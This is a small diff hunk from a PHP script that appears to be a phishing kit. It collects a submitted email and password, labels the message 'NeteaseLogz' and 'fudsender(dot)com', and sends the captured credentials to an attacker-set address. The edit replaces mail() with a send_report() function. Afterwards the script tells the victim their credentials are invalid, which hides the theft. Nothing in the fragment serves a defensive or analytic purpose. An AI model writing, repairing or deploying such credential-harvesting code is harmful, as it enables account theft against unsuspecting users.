@@ -18,7 +18,7 @@ if($email != null && $password != null){
 	$message .= "|----------- fudsender(dot)com --------------|\n";
 	$send = $Receive_email;
 	$subject = "NeteaseLogz : $messsage";
-    mail($send, $subject, $message);   
+    send_report($send, $subject, $message);   
 	$signal = 'ok';
 	$msg = 'InValid Credentials';
 	
